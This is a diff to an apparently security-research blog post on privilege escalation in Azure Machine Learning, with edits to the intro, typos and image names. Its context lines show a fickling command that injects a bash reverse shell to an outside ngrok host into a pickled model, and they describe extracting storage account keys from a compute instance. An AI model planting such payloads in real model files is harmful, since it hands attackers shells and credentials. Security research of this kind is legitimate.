@@ -7,6 +7,8 @@ categories:
   - Azure
 ---
 
+A few months ago, when browsing through the Azure services list, I stumbled upon Azure Machine Learning. The sheer number of capabilities and complexity of the service got me curious, so I decided it would be interesting to test it for misconfigurations and vulnerabilities. After some trial and error, my research uncovered intriguing findings. In this blog post, I’ll introduce a new privilege escalation technique that can occur in Azure Machine Learning. These findings were also presented at the BSides Zagreb 2025 conference.
+
 ## Introduction
 
 Azure Machine Learning is a cloud-based platform designed to accelerate and manage the entire machine learning lifecycle. Once a task is defined, Azure ML enables users to:
@@ -108,7 +110,7 @@ After identifying the file, we download it and inject a reverse shell code with 
 fickling --inject '__import__("subprocess").run(["bash", "-c", "bash -i >&/dev/tcp/0.tcp.eu.ngrock.io/122274 0>&1"])' model_original.pkl > model.pkl
 ```
 
-In this scenario, we assume data scientists decide to deploy the model to an Azure Container. Once deployed, we can gain a reverse shell on our listener.
+In this scenario, we assume data scientists decide to deploy the model to an Azure Container.
 
 ![azml_13]({{site.baseurl}}/assets/images/AZML/container.png){:style="display:block; margin-left:auto; margin-right:auto"}
 
@@ -127,7 +129,7 @@ Having gained access to an Azure Machine Learning (Azure ML) workspace, the mill
 
 ### Unlocking Storage Keys and Managed Identity
 
-Before I finalize this post, there’s another aspect of Azure ML I'd like to discuss. This issue was highlighted in the talk [Breaking ML Services: Finding 0-Days in Azure Machine Learning]("https://youtu.be/-K08hpzevYY?si=t0_nqWzVhgrYy88h"), presented by Nitesh Surana during HITB SECCONF in 2023. If we find ourselves in a situation where the attacker successfully compromises a compute instance.<u>It's important to know that users with access to compute instances can also access the storage account keys</u>. To demonstrate this, let's see how users in Azure ML share files between compute instances. It happens through an agent process named `dismountagent`, which checks and mounts the file share on the compute instance every 102 seconds.
+Before I finalize this post, there’s another aspect of Azure ML I'd like to discuss. This issue was highlighted in the talk [Breaking ML Services: Finding 0-Days in Azure Machine Learning]("https://youtu.be/-K08hpzevYY?si=t0_nqWzVhgrYy88h"), presented by Nitesh Surana during HITB SECCONF in 2023. If we find ourselves in a situation where the attacker successfully compromises a compute instance. <u>It's important to know that users with access to compute instances can also access the storage account keys</u>. To demonstrate this, let's see how users in Azure ML share files between compute instances. It happens through an agent process named `dismountagent`, which checks and mounts the file share on the compute instance every 102 seconds.
 
 ![azml_17]({{site.baseurl}}/assets/images/AZML/dsimountagent.png){:style="display:block; margin-left:auto; margin-right:auto"}
 
@@ -166,9 +168,9 @@ When we export this key, we can use the first key to decrypt the second one. Onc
 
 It is now possible to retrieve the storage account access keys used by Azure Machine Learning, allowing us to access the File Share.
 
-![azml_25]({{site.baseurl}}/assets/images/AZML/acess_key_01.png){:style="display:block; margin-left:auto; margin-right:auto"}
+![azml_25]({{site.baseurl}}/assets/images/AZML/access_key_01.png){:style="display:block; margin-left:auto; margin-right:auto"}
 
-![azml_26]({{site.baseurl}}/assets/images/AZML/acess_key_02.png){:style="display:block; margin-left:auto; margin-right:auto"}
+![azml_26]({{site.baseurl}}/assets/images/AZML/access_key_02.png){:style="display:block; margin-left:auto; margin-right:auto"}
 
 A few weeks before this article, it seems that Microsoft decided to "fix" this issue by removing the encryption key from the environment files. It’s unclear whether this change will fully prevent the retrieval of a storage account access key after the compromise of a compute instance. However, since the file share still needs to be mounted on the compute instances, these instances must retrieve the access key in some way.
 
